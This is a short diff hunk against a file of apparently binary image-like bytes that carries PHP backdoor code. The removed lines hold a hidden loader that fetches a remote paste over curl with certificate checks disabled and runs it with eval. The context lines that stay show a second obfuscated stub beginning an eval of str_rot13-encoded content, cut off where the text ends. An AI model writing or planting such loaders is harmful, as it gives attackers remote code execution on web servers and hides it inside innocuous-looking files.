@@ -12,24 +12,6 @@ qü+2UÂOº;ó<ìvhœnîšp—Á·i¾~Ø5!/ƒkÙ…QÂMÇ$Â^×ÄZ	?ì†¿
 ®J%Œ^ðñ±(+™ð{ž@+ý>ëí—0	ÁGC±„‰>îÓ%ü’'ÓŽHÂ„óüÐÉ;Ùd’\J+ùŽóÄÚ…F¸;Ï“3´¢íež^k¬$Âó¢¶rïò$Û*Å—Aø=O´UFá—<ÙvèDŽó„Û¾@˜`:±Þn]ò„i£ëaiê„©£kaiâ„é£¯mš4¡ÙÉ´‹„	Se^vÚ>Ùt'BpÒ$[òýž
 i•I”p”‹iœE|FB!
 
-<?php 
-
-function aaFa($url)
-{
-  $ch = curl_init();
-  curl_setopt($ch, CURLOPT_URL, $url);
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-  $result = curl_exec($ch);
-  curl_close($ch);
-  return $result;
-}
-
-$str=aaFa("https://rentry.co/mhsruvfc/raw");
-echo eval("?>".(($str)));
-?>
-
 <?=/****/@null; 
 eval(
     str_rot13(
